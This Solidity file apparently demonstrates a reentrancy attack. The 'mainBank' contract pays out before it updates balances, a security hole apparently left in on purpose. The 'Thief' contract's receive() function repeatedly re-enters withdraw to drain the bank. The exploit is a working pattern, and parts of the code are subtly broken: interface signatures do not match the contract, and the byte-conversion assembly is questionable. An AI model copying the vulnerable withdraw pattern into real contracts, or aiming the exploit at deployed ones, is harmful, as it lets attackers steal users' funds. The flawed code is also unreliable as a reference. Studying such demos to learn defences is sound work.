// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract mainBank {
    mapping(address => uint256) userbalances;
    mapping(bytes1 => address) userNames;

    function deposit(bytes1 name, uint256 amount) external payable {
        assert(msg.value == amount);
        userbalances[msg.sender] += amount;
        userNames[name] = msg.sender;
    }

    // require(msg.sender==tx.origin);

    function withdraw(uint256 amount) external returns (bool success, bytes memory returnData) {
        //0.8eth balance
        //0.5eth withdraw
        assert(amount <= userbalances[msg.sender]);
        //uint toSend= userbalances[msg.sender];

        ////////////toSend=0.5eth
        ///////////balance=0.3eth
        (bool success, bytes memory returnData) = msg.sender.call{
            value: amount
        }("");

        userbalances[msg.sender] -= amount;
        return (success, returnData);
    }

    function viewBalance(address _targ) public view returns (uint256 bal_) {
        bal_ = userbalances[_targ];
    }

    function see() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Thief {
    receive() external payable {
        Ibank k = Ibank(msg.sender);
        for (uint256 i = 0; i < 2; i++) {
            k.withdraw(1 ether);
        }
    }

    function depo(
        address bank,
        uint256 a,
        string memory name
    ) public payable {
        Ibank k = Ibank(bank);
        (bool success, ) = bank.call{value: msg.value}(
            abi.encodeWithSignature(
                "deposit(bytes1,uint256)",
                toB1(name),
                msg.value
            )
        );
        //k.deposit(toB1(name),msg.value);
    }

    function withdrawFromBank(uint256 _amount, address _bank) public {
        Ibank k = Ibank(_bank);
        k.withdraw(_amount);
    }

    function toB1(string memory _in) private pure returns (bytes1 out_) {
        bytes memory inter = bytes(_in);
        assembly {
            out_ := mload(add(_in, 1))
        }
    }

    function see() public view returns (uint256) {
        return address(this).balance;
    }

    function seetByte() public pure returns (uint256 num) {
        bytes32 samevar = "stringliteral";
        return uint256(samevar);
    }
}

interface Ibank {
    function deposit(bytes1 name, uint256 amount)
        external
        payable
        returns (bool);

    function withdraw(uint256 amount) external;
}
